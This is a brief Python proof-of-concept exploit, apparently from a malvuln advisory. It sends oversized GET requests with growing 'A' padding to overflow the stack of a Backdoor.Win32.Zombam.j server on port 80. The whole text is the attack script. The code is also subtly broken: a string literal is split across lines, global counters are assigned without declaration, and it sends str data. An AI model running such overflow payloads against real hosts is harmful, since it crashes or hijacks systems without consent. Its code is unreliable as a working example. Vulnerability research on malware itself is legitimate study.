Exploit/PoC:
from socket import *

MALWARE_INFECTED_HOST="x.x.x.x"
sz = 76660
c=1

def doit():
    while True:
        s=socket(AF_INET, SOCK_STREAM)
        s.connect((MALWARE_INFECTED_HOST, 80))
        sz += 2600
        JUNK="A"*sz
        PAYLOAD="GET /"+JUNK+" HTTP/1.0\r\nHost:
"+MALWARE_INFECTED_HOST+"\r\n\r\n"
        s.send(PAYLOAD)
        s.close()
        c+=1
        if c==3:
            exit()
    print("Backdoor.Win32.Zombam.j / Remote Stack Buffer Overflow")
    print("MD5: a4212f23e1cc3bb34b0dfe15b2ad323e")
    print("By malvuln")

if __name__=="__main__":
    doit()



